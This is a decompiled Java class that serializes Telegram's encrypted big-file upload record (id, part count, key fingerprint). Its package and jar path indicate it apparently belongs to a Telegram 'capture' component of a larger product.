package com.vvt.capture.telegram.internal;

public class TLRPC$TL_inputEncryptedFileBigUploaded
  extends TLRPC.InputEncryptedFile
{
  public static int constructor = 767652808;
  
  public void readParams(AbstractSerializedData paramAbstractSerializedData, boolean paramBoolean)
  {
    long l = paramAbstractSerializedData.readInt64(paramBoolean);
    this.id = l;
    int i = paramAbstractSerializedData.readInt32(paramBoolean);
    this.parts = i;
    i = paramAbstractSerializedData.readInt32(paramBoolean);
    this.key_fingerprint = i;
  }
  
  public void serializeToStream(AbstractSerializedData paramAbstractSerializedData)
  {
    int i = constructor;
    paramAbstractSerializedData.writeInt32(i);
    long l = this.id;
    paramAbstractSerializedData.writeInt64(l);
    i = this.parts;
    paramAbstractSerializedData.writeInt32(i);
    i = this.key_fingerprint;
    paramAbstractSerializedData.writeInt32(i);
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/telegram/internal/TLRPC$TL_inputEncryptedFileBigUploaded.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */